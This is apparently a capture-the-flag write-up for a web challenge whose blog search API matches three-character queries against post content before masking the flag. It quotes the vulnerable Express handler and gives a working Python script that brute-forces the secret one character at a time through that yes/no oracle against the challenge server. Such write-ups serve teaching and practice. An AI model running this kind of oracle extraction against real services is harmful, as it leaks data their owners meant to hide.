## Description
What's the name of this CTF? Yk what to do 😉

## Solution
We've been given a site which has a list of blogs.
<img width="1897" height="872" alt="image" src="https://github.com/user-attachments/assets/c8fabc9a-cbc5-4be8-9f80-d5554c61ce0f" />

The application is vulnerable to a side-channel attack known as XS-Search, a subclass of XS-Leaks. By observing differences in server responses based on 3-character search queries, we reconstructed the flag one character at a time.

The leak occurs due to redacted content masking the real flag but not filtering it out entirely, allowing us to detect its presence via a simple YES/NO oracle.

In the source code `index.js`:
```javascript
const FLAG = 'L3AK{t3mp_flag!!}';

...

app.post('/api/search', (req, res) => {
    const { query } = req.body;

    if (!query || typeof query !== 'string' || query.length !== 3) {
        return res.status(400).json({ error: 'Query must be 3 characters.' });
    }

    const matchingPosts = posts
        .filter(post =>
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        )
        .map(post => ({
            ...post,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
        }));

    res.json({
        results: matchingPosts,
        count: matchingPosts.length,
        query
    });
});
```
We observe that
* Search is restricted to 3-character queries.
* Matching happens on full content, but redaction (*) happens after the match.
* The flag is still matched, just hidden on display.

So writing this solve script we then obtain the flag.
```Python
import string
import requests

URL = 'http://34.134.162.213:17000/api/search'

alphabet = string.printable.strip()
known = 'L3AK{'

print(f"[+] Starting brute-force with prefix: {known}")

while not known.endswith('}'):
    found = False
    for c in alphabet:
        probe = (known + c)[-3:]
        r = requests.post(URL, json={"query": probe})
        data = r.json()

        # Filter out decoy match (like post id 4) by checking for masked content
        for post in data.get('results', []):
            if '*' in post['content']:
                print(f"[+] Match found via mask for '{probe}' → adding '{c}' to flag")
                known += c
                found = True
                break

        if found:
            break

    if not found:
        print("[-] No matching character found: maybe charset is wrong or flag ended.")
        break

print(f"\n Final reconstructed flag: {known}")
```
